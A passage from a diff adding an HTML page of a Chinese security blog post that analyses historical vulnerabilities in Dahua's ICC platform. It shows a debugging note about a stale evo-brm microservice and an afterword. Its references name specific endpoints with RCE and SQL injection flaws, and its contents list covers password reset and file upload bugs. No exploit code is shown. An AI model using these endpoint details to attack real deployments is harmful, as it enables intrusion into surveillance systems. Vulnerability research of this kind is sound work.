class="number">0</span> <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">8941</span>     <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">54197</span>    ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">51076</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">3306</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">52659</span>    <span class="number">192.168</span>.<span class="number">131.46</span><span class="punctuation">:</span><span class="number">8915</span>     ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">46329</span>         <span class="number">127.0</span>.<span class="number">0.1</span><span class="punctuation">:</span><span class="number">6379</span>          ESTABLISHED <span class="number">24091</span>/evo-brm       </span><br><span class="line">unix  <span class="number">2</span>      <span class="punctuation">[</span> <span class="punctuation">]</span>         STREAM     CONNECTED     <span class="number">85542</span>    <span class="number">24091</span>/evo-brm        </span><br><span class="line">unix  <span class="number">2</span>      <span class="punctuation">[</span> <span class="punctuation">]</span>         STREAM     CONNECTED     <span class="number">563766567</span> <span class="number">17688</span>/evo-brm        </span><br><span class="line">unix  <span class="number">2</span>      <span class="punctuation">[</span> <span class="punctuation">]</span>         STREAM     CONNECTED     <span class="number">79100</span>    <span class="number">24091</span>/evo-brm        </span><br><span class="line">unix  <span class="number">2</span>      <span class="punctuation">[</span> <span class="punctuation">]</span>         STREAM     CONNECTED     <span class="number">563786467</span> <span class="number">17688</span>/evo-brm</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，新开debug brm时，没有自动结束原本的微服务，导致只开了个远程调试端口。</p>
+<p>后面到evo-brm&#x2F;bin 执行了 stop.sh，然后再重新start-debug.sh时，就可以了。</p>
+<p>总结，重启服务前，记得stop，停止后最好再看一下相应的PID有没有结束；调试微服务要注意有没有多个相同的微服务实例，断点失败时，可能是由于开远程调试的JVM和实际处理请求的微服务不是同一个。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这里主要分析的是两层接口转发，一层在nginx，一层在apigw。由于第一次分析有接口转发的系统，所以花费了不少时间。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a class="link"   target="_blank" rel="noopener" href="https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Foverall_introduction.html&version=enterprisebase/5.0.17&blank=true" >https://open-icc.dahuatech.com/#/home?url=%3Fnav%3Dwiki%2Fcommon%2Foverall_introduction.html&amp;version=enterprisebase/5.0.17&amp;blank=true<i class="fas fa-external-link-alt"></i></a>   ICC文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://support.dahuatech.com/dataDirectory?IsDpValue=GNuuqRr8IGCNXISohq0PRiTwd+YZQaHMbRLlnWgQR7LkCpfYouOzHFVzwBlKSIgRXpeQcR4IX0bID+bCMvLapd3oYU4GfsTR457ORI9X0aFRyAdZzJvSHdfRbfxqVQQgP2wCGQiL7IfFINK1DdOqEsX6GWYTUv3lU9Wd3OVgQnuAOh73aiPL2I4dPrWvW29eYYV6QgaU4CTuRuA0wQaFUA==" >https://support.dahuatech.com/dataDirectory?IsDpValue=GNuuqRr8IGCNXISohq0PRiTwd%2BYZQaHMbRLlnWgQR7LkCpfYouOzHFVzwBlKSIgRXpeQcR4IX0bID%2BbCMvLapd3oYU4GfsTR457ORI9X0aFRyAdZzJvSHdfRbfxqVQQgP2wCGQiL7IfFINK1DdOqEsX6GWYTUv3lU9Wd3OVgQnuAOh73aiPL2I4dPrWvW29eYYV6QgaU4CTuRuA0wQaFUA%3D%3D<i class="fas fa-external-link-alt"></i></a>  软件资料</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18518" >https://xz.aliyun.com/news/18518<i class="fas fa-external-link-alt"></i></a>  	&#x2F;evo-runs&#x2F;v1.0&#x2F;receive   RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Domren/articles/19010351" >https://www.cnblogs.com/Domren/articles/19010351<i class="fas fa-external-link-alt"></i></a>		&#x2F;evo-runs&#x2F;v1.0&#x2F;push	RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Domren/articles/19473055" >https://www.cnblogs.com/Domren/articles/19473055<i class="fas fa-external-link-alt"></i></a>		ars&#x2F;list 接口存在SQL注入</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                某华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/04/16/大华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-04-16 21:56</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/30/Smartbi%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94%E2%80%94%E2%80%94RMIServlet%E6%8E%A5%E5%8F%A3%E5%BC%95%E5%8F%91%E7%9A%84%E6%83%A8%E6%A1%88/"
+                                   title="Smartbi历史漏洞分析(一)————RMIServlet接口引发的惨案"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Smartbi历史漏洞分析(一)————RMIServlet接口引发的惨案</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">项目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx%E7%BD%91%E5%85%B3"><span class="nav-number">3.</span> <span class="nav-text">nginx网关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-conf"><span class="nav-number">3.1.</span> <span class="nav-text">nginx.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upstream-conf"><span class="nav-number">3.2.</span> <span class="nav-text">upstream.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-local-runs-conf"><span class="nav-number">3.3.</span> <span class="nav-text">web_local_runs.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-local-https-entry-conf"><span class="nav-number">3.4.</span> <span class="nav-text">web_local_https_entry.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apigw%E7%B3%BB%E5%88%97"><span class="nav-number">3.5.</span> <span class="nav-text">apigw系列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#evo-apigw%E7%BD%91%E5%85%B3"><span class="nav-number">4.</span> <span class="nav-text">evo-apigw网关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw"><span class="nav-number">4.1.</span> <span class="nav-text">evo-apigw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-discover"><span class="nav-number">4.2.</span> <span class="nav-text">evo-discover</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-brm"><span class="nav-number">4.3.</span> <span class="nav-text">evo-brm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-oauth"><span class="nav-number">4.4.</span> <span class="nav-text">evo-oauth</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw-nacos-sync-xxx-jsp%E7%9A%84%E7%89%B9%E6%AE%8A%E6%80%A7"><span class="nav-number">4.5.</span> <span class="nav-text">&#x2F;evo-apigw&#x2F;nacos-sync&#x2F;xxx.jsp的特殊性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="nav-number">4.6.</span> <span class="nav-text">特殊情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.7.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">鉴权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw%E7%B3%BB%E5%88%97"><span class="nav-number">5.1.</span> <span class="nav-text">evo-apigw系列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-run%E7%B3%BB%E5%88%97"><span class="nav-number">5.2.</span> <span class="nav-text">evo-run系列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">7.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ars-list-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.1.</span> <span class="nav-text">&#x2F;ars&#x2F;list SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#push-receive-RCE-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">7.2.</span> <span class="nav-text">&#x2F;push&amp;&#x2F;receive RCE&amp;文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetClassValue-RCE"><span class="nav-number">7.4.</span> <span class="nav-text">&#x2F;GetClassValue RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#system%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.5.</span> <span class="nav-text">system用户密码重置漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.6.</span> <span class="nav-text">其他漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="nav-number">7.7.</span> <span class="nav-text">漏洞挖掘思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9"><span class="nav-number">8.</span> <span class="nav-text">应用指纹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87"><span class="nav-number">9.</span> <span class="nav-text">疑难杂症</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%AD%E7%82%B9%E5%A4%B1%E8%B4%A5"><span class="nav-number">9.1.</span> <span class="nav-text">断点失败</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">11.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">182.7k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">项目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx%E7%BD%91%E5%85%B3"><span class="nav-number">3.</span> <span class="nav-text">nginx网关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx-conf"><span class="nav-number">3.1.</span> <span class="nav-text">nginx.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upstream-conf"><span class="nav-number">3.2.</span> <span class="nav-text">upstream.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-local-runs-conf"><span class="nav-number">3.3.</span> <span class="nav-text">web_local_runs.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-local-https-entry-conf"><span class="nav-number">3.4.</span> <span class="nav-text">web_local_https_entry.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apigw%E7%B3%BB%E5%88%97"><span class="nav-number">3.5.</span> <span class="nav-text">apigw系列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#evo-apigw%E7%BD%91%E5%85%B3"><span class="nav-number">4.</span> <span class="nav-text">evo-apigw网关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw"><span class="nav-number">4.1.</span> <span class="nav-text">evo-apigw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-discover"><span class="nav-number">4.2.</span> <span class="nav-text">evo-discover</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-brm"><span class="nav-number">4.3.</span> <span class="nav-text">evo-brm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-oauth"><span class="nav-number">4.4.</span> <span class="nav-text">evo-oauth</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw-nacos-sync-xxx-jsp%E7%9A%84%E7%89%B9%E6%AE%8A%E6%80%A7"><span class="nav-number">4.5.</span> <span class="nav-text">&#x2F;evo-apigw&#x2F;nacos-sync&#x2F;xxx.jsp的特殊性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="nav-number">4.6.</span> <span class="nav-text">特殊情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.7.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">鉴权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-apigw%E7%B3%BB%E5%88%97"><span class="nav-number">5.1.</span> <span class="nav-text">evo-apigw系列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evo-run%E7%B3%BB%E5%88%97"><span class="nav-number">5.2.</span> <span class="nav-text">evo-run系列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">7.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ars-list-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.1.</span> <span class="nav-text">&#x2F;ars&#x2F;list SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#push-receive-RCE-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">7.2.</span> <span class="nav-text">&#x2F;push&amp;&#x2F;receive RCE&amp;文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetClassValue-RCE"><span class="nav-number">7.4.</span> <span class="nav-text">&#x2F;GetClassValue RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#system%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.5.</span> <span class="nav-text">system用户密码重置漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.6.</span> <span class="nav-text">其他漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="nav-number">7.7.</span> <span class="nav-text">漏洞挖掘思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9"><span class="nav-number">8.</span> <span class="nav-text">应用指纹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87"><span class="nav-number">9.</span> <span class="nav-text">疑难杂症</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%AD%E7%82%B9%E5%A4%B1%E8%B4%A5"><span class="nav-number">9.1.</span> <span class="nav-text">断点失败</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">11.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
